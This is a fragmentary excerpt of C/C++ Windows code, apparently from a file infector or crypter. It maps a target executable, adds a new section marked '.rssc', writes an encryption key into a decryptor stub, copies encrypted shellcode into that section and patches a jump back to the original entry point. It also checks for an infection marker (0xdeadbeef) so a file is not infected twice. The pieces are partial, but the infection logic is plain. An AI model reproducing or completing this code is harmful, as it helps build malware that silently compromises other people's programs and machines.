...
const int JMP_OFFSET = 0x13;
const int PASSING_PARAMS_OPCODES_SIZE = 30;
...
#pragma GCC diagnostic pop
    ...
    HANDLE targetMapping = _CreateFileMappingA(target, NULL, PAGE_READWRITE, 0,
                                               MEM_ALIGN(targetFileSize + shellcodeSize + PASSING_PARAMS_OPCODES_SIZE + 100, fileAlignment), NULL);
    ...
    *(PDWORD64)((ULONG_PTR)targetDecryptorLocation + 22) = encryptionKey;
    ...
    _RtlCopyMemory((LPVOID)((ULONG_PTR)targetDecryptorLocation + PASSING_PARAMS_OPCODES_SIZE), ciphersOpcode[cipherId], ciphersSize[cipherId]);

    // Copy shellcode
    LPVOID targetEncryptedShellcodeLocation = targetDecryptorLocation + PASSING_PARAMS_OPCODES_SIZE + ciphersSize[cipherId];
    ...
    if (*(PDWORD64)shellcode->Name != 0x637373722e) {
        ...
        DWORD64 decryptorSize = *(PDWORD64)((ULONG_PTR)decryptorLocation + 2) + PASSING_PARAMS_OPCODES_SIZE;
    ...
    *(PDWORD)(targetEncryptedShellcodeLocation + JMP_OFFSET) =
        ntHeaders->OptionalHeader.AddressOfEntryPoint -
        (newSection->VirtualAddress + PASSING_PARAMS_OPCODES_SIZE + ciphersSize[cipherId] + JMP_OFFSET + 4);
...
#pragma GCC diagnostic pop
    ...
    if (shellcode) {
        // .rssc
        result =
            *(PDWORD64)shellcode->Name == 0x637373722e || *(PDWORD)((ULONG_PTR)baseAddress + shellcode->PointerToRawData + JMP_OFFSET) == 0xdeadbeef;
    }
